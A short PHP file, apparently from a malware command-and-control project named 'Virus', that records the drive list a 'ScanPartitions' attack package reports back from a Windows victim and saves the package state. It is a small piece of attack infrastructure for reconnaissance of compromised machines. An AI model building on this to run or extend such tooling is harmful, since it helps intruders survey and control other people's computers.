<?php

use Kelvinho\Virus\Attack\Packages\Windows\OneTime\ScanPartitions;

/** @var ScanPartitions $this */

$drives = $this->requestData->postCheck("drives");
$this->setAvailableDrives($drives);
$this->setExecuted();
$this->saveState();
